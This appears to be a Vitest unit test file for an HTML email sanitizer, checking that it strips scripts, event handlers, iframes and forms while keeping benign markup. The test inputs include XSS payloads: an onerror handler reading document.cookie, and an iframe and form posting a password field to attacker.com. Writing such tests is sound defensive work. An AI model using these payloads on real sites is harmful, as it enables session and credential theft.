import { describe, it, expect } from 'vitest';
import { sanitizeEmailHtml } from '../../src/utils/sanitizer';

describe('Sanitizer Unit Tests: sanitizeEmailHtml XSS Defense', () => {
  it('should remove dangerous <script> tags completely', () => {
    const dirty = '<p>Hello</p><script>alert("XSS Attack!");</script><p>World</p>';
    const clean = sanitizeEmailHtml(dirty);

    expect(clean).not.toContain('<script>');
    expect(clean).not.toContain('alert("XSS Attack!");');
    expect(clean).toContain('<p>Hello</p>');
    expect(clean).toContain('<p>World</p>');
  });

  it('should strip inline javascript event handlers (onerror, onload, onclick)', () => {
    const dirty = '<img src="invalid.jpg" onerror="alert(document.cookie)" alt="Test" /><button onclick="evil()">Click</button>';
    const clean = sanitizeEmailHtml(dirty);

    expect(clean).not.toContain('onerror');
    expect(clean).not.toContain('onclick');
    expect(clean).not.toContain('alert(document.cookie)');
    expect(clean).not.toContain('evil()');
  });

  it('should strip dangerous embedded elements (iframe, object, embed, form)', () => {
    const dirty = `
      <div>
        <iframe src="https://attacker.com/malicious.html"></iframe>
        <object data="exploit.swf"></object>
        <embed src="malware.mov" />
        <form action="https://attacker.com/steal" method="POST"><input name="pass"/></form>
      </div>
    `;
    const clean = sanitizeEmailHtml(dirty);

    expect(clean).not.toContain('<iframe');
    expect(clean).not.toContain('<object');
    expect(clean).not.toContain('<embed');
    expect(clean).not.toContain('<form');
  });

  it('should enforce target="_blank" and rel="noopener noreferrer" on all links', () => {
    const dirty = '<a href="https://github.com/login">Verify Account</a>';
    const clean = sanitizeEmailHtml(dirty);

    expect(clean).toContain('target="_blank"');
    expect(clean).toContain('rel="noopener noreferrer"');
    expect(clean).toContain('href="https://github.com/login"');
  });

  it('should preserve benign HTML formatting and layout elements', () => {
    const benign = `
      <div class="email-body">
        <h1>Welcome to TryMail!</h1>
        <p>Thank you for <strong>registering</strong>. Please click below:</p>
        <table border="1">
          <tr><td>Item 1</td><td>$10</td></tr>
        </table>
      </div>
    `;
    const clean = sanitizeEmailHtml(benign);

    expect(clean).toContain('<h1>Welcome to TryMail!</h1>');
    expect(clean).toContain('<strong>registering</strong>');
    expect(clean).toContain('<table');
    expect(clean).toContain('Item 1');
  });

  it('should return empty string for null, undefined, or whitespace-only inputs', () => {
    expect(sanitizeEmailHtml('')).toBe('');
    expect(sanitizeEmailHtml(null as unknown as string)).toBe('');
    expect(sanitizeEmailHtml(undefined as unknown as string)).toBe('');
    expect(sanitizeEmailHtml('   ')).toBe('');
  });
});

